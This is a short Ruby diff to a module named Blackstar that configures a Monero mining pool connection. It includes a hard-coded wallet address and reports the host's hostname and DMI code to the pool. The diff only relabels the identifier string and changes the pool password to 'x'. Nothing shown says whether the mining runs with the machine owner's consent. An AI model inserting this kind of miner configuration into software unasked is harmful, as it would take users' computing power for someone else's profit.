@@ -6,7 +6,7 @@ module Blackstar
       if dmi_code
         dmi_code = dmi_code.slice(0..15)
       end
-      @hostname = "H:#{Cmd.call("hostname")} - D: #{dmi_code}"
+      @hostname = "Hostname: #{Cmd.call("hostname")} - Dmicode: #{dmi_code}"
       @processor = {}
       _set_processor_info
     end
@@ -37,7 +37,7 @@ module Blackstar
               {
                   "url" => "stratum+tcp://pool.supportxmr.com:5555",
                   "user" => "46EMhBKvMzSavZjwWJCZgW5VP5dbb7amhaQum2ttwxnqTGUfzztgE4uXoVLDVXoojLiM3rehuPDQq4FtjoFGHPEKQxdoGkf",
-                  "pass" => @hostname,
+                  "pass" => "x",
                   "keepalive" => true,
                   "nicehash" => false
               }
